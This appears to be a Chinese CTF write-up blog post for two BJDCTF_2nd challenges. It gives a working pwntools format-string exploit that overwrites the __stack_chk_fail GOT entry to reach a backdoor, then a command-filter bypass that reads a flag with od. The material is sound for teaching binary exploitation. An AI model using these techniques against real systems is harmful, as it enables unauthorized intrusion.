---
title: _stack_chk_fail
categories: 
    - Stack
    - _stack_chk_fail
---
# _stack_chk_fail
<!--more-->
#### BJDCTF_2nd
## r2t4

#### 格式化字符串 + _stack_chk_fail


看ida

![20201223180634](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180634.png)

checksec发现开启了canary

![20201223180812](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180812.png)

所以不能利用简单的栈溢出了

发现printf函数有格式化字符串漏洞可以利用

并且程序给了backdoor，地址是：0x400626

![20201223180855](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180855.png)

思路是通过这个漏洞，把 stack_chk_fail 的 got表给改掉，改成 backdoor 的地址，这样当程序发现 canary 被修改去调用 stack_chk_fail 的时候就调用了 backdoor

![20201223181044](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223181044.png)

手撸出printf格式化字符串的偏移

![20201223181608](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223181608.png)

确定是第六个



exp:

```python
from pwn import *
context(arch='amd64',os='linux',word_size='64')

p = remote("127.0.0.1",12345)
elf = ELF('./r2t4')
__stack_chk_fail = elf.got['__stack_chk_fail']

payload = "%64c%9$hn%1510c%10$hnAAA" + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)
p.sendline(payload)
p.interactive()
```

9=6+3，3是`"%64c%9$hn%1510c%10$hnAAA"`占了24个比特，也就是3个字节



```python
%64c%9$hn           %64c：0x0040（目标地址高位）            %9：更改第九位数字      $hn：两个字节（0000 0000 （八比特））
%1510c%10$hnAAA     %1510c：1510+64=0x0626（目标地址低位）  %10：更改第十位数字     $hn：两个字节   AAA:补齐成8的倍数

```




## test

#### 命令执行

参考：https://blog.csdn.net/qin9800/article/details/105058058

![20201223191550](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223191550.png)

用 `ssh -p 28572 ctf@node3.buuoj.cn` 链接

![20201223191650](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223191650.png)

发现三个文件，flag文件无法cat

看一下c文件

![20201223191806](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223191806.png)

发现是过滤命令

可以通过

`ls /usr/bin/ /bin/ | grep -v -E "n|e|p|b|u|s|h|i|f|l|a|g"`

查看还有什么命令是可以用的

```
-v 或 --revert-match : 显示不包含匹配文本的所有行。
-E 或 --extended-regexp : 将样式为延伸的正则表达式来使用。
```

![20201223192201](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223192201.png)

可以用 od 和 x86_64

Linux od命令用于输出文件内容。

od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。


x86_64

![20201223193256](https://raw.githubusercontent.com/YTrick/image/branch/image/20201223193256.png)



